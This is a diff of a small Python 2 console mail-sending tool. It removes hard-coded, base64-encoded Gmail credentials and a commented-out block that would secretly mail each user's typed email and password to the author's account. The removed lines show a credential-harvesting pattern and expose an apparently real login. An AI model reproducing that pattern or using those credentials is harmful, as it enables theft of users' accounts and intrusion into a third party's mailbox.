@@ -11,9 +11,6 @@ from email import encoders
 
 clear = lambda: os.system('clear')
 
-mymail = base64.b64decode('aW5kaGlmYXJoYW5kaWthQGdtYWlsLmNvbQ==') #My Email
-ps = base64.b64decode('aW5maXRhMTk5OQ==') #My Password
-
 def iTools():
     clear() #Clear Console
     print "\t\t\t    iTools Mail"
@@ -36,20 +33,8 @@ def hel():
     raw_input('Tekan Enter untuk kembali ke Menu')
     iTools()
 def PesanFile():
-    #mymail = raw_input('Email : ')
-    #pas = getpass.getpass('Password : ')
-    #if pas == '':
-    #    return pesan()
-    #else:
-    #    my = base64.b64decode('aW5kaGlmYXJoYW5kaWthQGdtYWlsLmNvbQ==')
-    #    py = base64.b64decode('aW5maXRhMTk5OQ==')
-    #    dd = str(mymail+pas)
-    #    p1 = base64.b64encode(dd)
-    #    server = smtplib.SMTP('smtp.gmail.com',587)
-    #    server.starttls()
-    #    server.login(my,py)
-    #    server.sendmail(my,my,p1)
-    #    server.quit()
+    mymail = raw_input('Email : ')
+    ps = getpass.getpass('Password : ')
     yumail = raw_input('To : ')
     subject = raw_input('Subject : ')
     msg = MIMEMultipart()
